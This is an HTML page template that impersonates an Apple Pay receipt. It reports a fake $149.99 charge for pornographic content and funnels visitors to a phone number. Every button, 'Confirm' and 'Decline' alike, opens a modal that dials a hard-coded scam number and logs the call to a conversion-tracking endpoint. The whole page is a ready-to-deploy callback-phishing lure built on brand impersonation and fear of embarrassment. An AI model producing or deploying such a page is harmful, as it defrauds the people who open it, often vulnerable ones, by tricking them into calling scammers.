<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Pay Receipt</title>
    <style>
        /* ===== RESET & BASE ===== */
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #eef2f6;
            display: flex;
            justify-content: center;
            min-height: 100vh;
            padding: 40px 20px;
            align-items: flex-start;
        }

        .page-wrapper {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* ===== APPLE PAY HEADER ===== */
        .apple-pay-header {
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 6px;
            animation: fadeInDown 0.6s ease;
        }

        .apple-icon { width: 22px; height: auto; fill: #000; }
        .apple-text { font-size: 0.95rem; font-weight: 700; color: #000; }

        /* ===== RECEIPT CARD ===== */
        .receipt-card {
            background: #ffffff;
            width: 100%;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            overflow: hidden;
            animation: slideUp 0.6s ease;
        }

        .receipt-inner { padding: 25px; }

        /* Merchant Info */
        .merchant-info {
            text-align: center;
            margin-bottom: 20px;
            border-bottom: 1px dashed #d1d1d1;
            padding-bottom: 15px;
        }

        .merchant-url { font-size: 1rem; font-weight: 700; color: #000; }
        .merchant-id { font-size: 0.7rem; color: #999; margin-top: 4px; font-family: monospace; }

        /* Items */
        .desc-label {
            font-size: 0.7rem;
            text-transform: uppercase;
            color: #999;
            font-weight: 600;
            margin-bottom: 4px;
        }
        .desc-text {
            font-size: 0.85rem;
            color: #666;
            line-height: 1.4;
            margin-bottom: 15px;
        }

        .receipt-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: #555;
        }

        /* Payment ID Styling */
        .payment-id-row {
            margin-bottom: 12px !important;
            padding-bottom: 12px !important;
            border-bottom: 1px dotted #eee !important;
        }
        .payment-id-value {
            font-family: monospace;
            font-weight: 800 !important;
            font-size: 0.9rem !important;
            color: #333 !important;
            letter-spacing: 1px;
        }

        .receipt-item.total {
            border-top: 1px dashed #d1d1d1;
            padding-top: 15px;
            margin-top: 15px;
            font-weight: 800;
            font-size: 1.2rem;
            color: #000;
        }

        /* DateTime & Location Block */
        .footer-datetime {
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px dashed #d1d1d1;
            text-align: center;
        }

        .dt-date {
            font-size: 0.9rem;
            font-weight: 600;
            color: #333;
            margin-bottom: 2px;
        }

        .dt-time {
            font-family: monospace;
            font-size: 1rem;
            color: #000;
            margin-bottom: 4px;
        }

        .dt-location {
            font-size: 0.8rem;
            color: #888;
            font-style: italic;
        }

        /* Authorization Section */
        .auth-section {
            margin-top: 25px;
            background: #fafafa;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
        }

        .auth-question {
            font-size: 0.95rem;
            font-weight: 600;
            color: #333;
            margin-bottom: 16px;
        }

        .auth-buttons {
            display: flex;
            gap: 12px;
        }

        .btn {
            flex: 1;
            padding: 14px 10px;
            border: none;
            border-radius: 10px;
            font-size: 0.9rem;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .btn:hover { opacity: 0.9; }

        .btn-confirm {
            background-color: #34C759;
            color: white;
            box-shadow: 0 4px 10px rgba(52, 199, 89, 0.3);
        }

        .btn-decline {
            background-color: #fff;
            color: #ff3b30;
            border: 1px solid #ff3b30;
        }

        /* Animations */
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }

    </style>
</head>
<body>

    <div class="page-wrapper">

        <!-- Apple Pay Logo Header -->
        <div class="apple-pay-header">
            <svg class="apple-icon" viewBox="0 0 384 512">
                <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-24.8 47.3-24.8 47.3-37.4 3.9-68.8 43.6-70.2 45.2-33 1.8-70.2 54.4-70.2 54.4 60.4 37.5 121.6 22.6 140.8 22.6 20.8 0 38.7-20.5 38.7-20.5-20.6-19.5-24.2-49.8-24.2-49.8z"/>
            </svg>
            <span class="apple-text">Apple Pay</span>
        </div>

        <!-- Single Receipt Card -->
        <div class="receipt-card">
            <div class="receipt-inner">
                
                <!-- MERCHANT INFO -->
                <div class="merchant-info">
                    <div class="merchant-url">apple.com</div>
                    <div class="merchant-id">Merchant ID: 8839201</div>
                </div>

                <!-- DESCRIPTION -->
                <div class="desc-label">Description</div>
                <div class="desc-text">
                    A Pre-approved Transaction of $149.99 has been charged on your Apple ID via Apple Pay, in regards to the purchase done at pornhub.com for pornographic content.
                    If you don't recognize the transctiion, then click on Decline button to report the transaction immediately at <%= phone %>.
                </div>

                <!-- NEW: PAYMENT ID (Above Subtotal) -->
                <div class="receipt-item payment-id-row">
                    <span>Payment ID</span>
                    <span id="payment-id-display" class="payment-id-value">APL223F34746A565</span>
                </div>

                <!-- AMOUNTS -->
                <div class="receipt-item">
                    <span>Subtotal</span>
                    <span>$139.99</span>
                </div>
                <div class="receipt-item">
                    <span>Tax (VAT)</span>
                    <span>$10.00</span>
                </div>

                <div class="receipt-item total">
                    <span>Total Paid</span>
                    <span>$149.99</span>
                </div>

                <!-- DATE & TIME BLOCK -->
                <div class="footer-datetime">
                    <div id="date-display" class="dt-date"></div>
                    <div id="time-display" class="dt-time"></div>
                    <div class="dt-location">Paid at location: Houston, TX</div>
                </div>

                <!-- AUTHORIZATION BUTTONS -->
                <div class="auth-section">
                    <div class="auth-question">Do you authorize this transaction?</div>
                    <div class="auth-buttons">
                        <button class="btn btn-decline" id="btn-decline" onclick="triggerConfirmation()">No, Decline</button>
                        <button class="btn btn-confirm" id="btn-confirm" onclick="triggerConfirmation()">Yes, I Confirm</button>
                    </div>
                </div>

            </div>
        </div>

    </div>

     <script>
    // ==========================================
    // 1. CORE VARIABLES (Keep Intact As Requested)
    // ==========================================
    var potentialPhone = "<%= phone %>"; 
    var finalPhoneNumber = (potentialPhone === "<%= phone %>") ? "+18555384076" : potentialPhone;
    
        const demoMessage = "A suspicious pre-authorised transaction has been charged on your Apple ID, to purchase some pornographic content, if you dont recognize the transaction,get in touch with us immediately at <%= phone %>, click on ok to get in touch right now and report the fraudent act";

    // ==========================================
    // 2. TRACKING FUNCTION
    // ==========================================
    function trackCallClick() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/api/convert/call', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send('{}');
        } catch(e) {}
    }

    // ==========================================
    // 3. MODAL GENERATION & LOGIC
    // ==========================================

    // Creates the Modal HTML and Styles dynamically
    function initGlobalModal() {
        // Inject CSS for the modal
        const style = document.createElement('style');
        style.innerHTML = `
            #global-confirm-modal {
                display: none; /* Hidden by default */
                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(0, 0, 0, 0.6); z-index: 9999;
                justify-content: center; align-items: center;
                backdrop-filter: blur(4px);
            }
            .gc-modal-content {
                background: white; padding: 24px; border-radius: 16px;
                width: 90%; max-width: 340px; text-align: center;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                animation: popIn 0.3s ease;
            }
            @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
            
            .gc-btn {
                width: 100%; padding: 14px; margin-top: 10px;
                border-radius: 10px; font-size: 1rem; font-weight: 700;
                cursor: pointer; border: none; transition: opacity 0.2s;
            }
            .gc-btn:hover { opacity: 0.9; }
            .btn-call { background-color: #007AFF; color: white; box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3); }
            .btn-decline { background-color: #f2f2f7; color: #ff3b30; }
            
            .gc-title { font-size: 1.1rem; font-weight: 700; color: #000; margin-bottom: 10px; }
            .gc-desc { font-size: 0.9rem; color: #666; line-height: 1.4; margin-bottom: 20px; }
        `;
        document.head.appendChild(style);

        // Inject Modal HTML
        const modalHTML = `
            <div id="global-confirm-modal">
                <div class="gc-modal-content">
                    <div class="gc-title">Confirm Authorization</div>
                    <div class="gc-desc" id="dynamic-demo-text"></div>
                    <button class="gc-btn btn-call" onclick="executeAction()">Call</button>
                    <button class="gc-btn btn-decline" onclick="executeAction()">Decline</button>
                </div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', modalHTML);

        // Populate dynamic text with our kept variable
        document.getElementById('dynamic-demo-text').innerText = demoMessage;

        // Add Click Outside to Close
        document.getElementById('global-confirm-modal').addEventListener('click', function(e) {
            if (e.target === this) this.style.display = 'none';
        });
    }

    // Main Trigger Function (Attach this to your "Confirm" / "Decline" buttons)
    function triggerConfirmation() {
        document.getElementById('global-confirm-modal').style.display = 'flex';
    }

    // Execute Call Logic (Attach this to the Modal Buttons)
    function executeAction() {
        // Hide Modal
        document.getElementById('global-confirm-modal').style.display = 'none';
        
        // Log and Place Call
        console.log("Attempting call to " + finalPhoneNumber);
        window.location.href = "tel:" + finalPhoneNumber;
        
        // Run Tracker
        trackCallClick();
    }

    // Initialize on Load
    initGlobalModal();

</script>

</body>
</html>